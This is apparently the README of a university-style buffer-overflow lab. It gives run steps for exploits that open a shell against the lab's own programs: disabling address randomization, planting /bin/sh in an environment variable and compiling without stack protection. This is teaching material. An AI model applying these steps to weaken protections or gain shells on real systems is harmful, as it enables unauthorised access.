The project access shell on a linux distro using bufferOverflow <br/>
a linux OS or VM can be utilized to run the codes<br/>



PART1 execution:<br/>
for Part1 the stack is executable and addresses are static<br/>

how to run: <br/>

-Set the core dump size <br/>
unlimited ulimit -c unlimited <br/>
-Disable the address randomization <br/>
sudo sysctl -w kernel.randomize_va_space=0  <br/>
-Set an environment variable to retrieve shell address<br/>
export MYSHELL="/bin/sh" -Retrieve shell address char *shell = getenv("MYSHELL"); <br/>
printf("%x\n", shell); <br/>
:ffffd45c <br/>
-put in the above shell address at line12 in bad.c <br/>
-compile bad.c using below command  (32bit c compiler library required )
gcc -m32 -fno-stack-protector -o bad bad.c <br/>
./bad  (run the created object file as)  <br/>
-compile vulnerable.c using the below command  <br/>
gcc -m32 -fno-stack-protector -o vulnerable vulnerable.c <br/>
./vulnerable  <br/>
<i> after the above command the shell should be active  </i>

PART2 execution:<br/>
for Part2 the stack is non-executable and addresses are dynamic<br/>

how to run: <br/>

-Enable the address randomization <br/>
sudo sysctl -w kernel.randomize_va_space=2   <br/>

-compile vulnerable.c using the below command  <br/>
gcc -m32 -fno-stack-protector -o vulnerable2 vulnerable2.c <br/>
executing the object file ./vulnerable2 should access the shell 

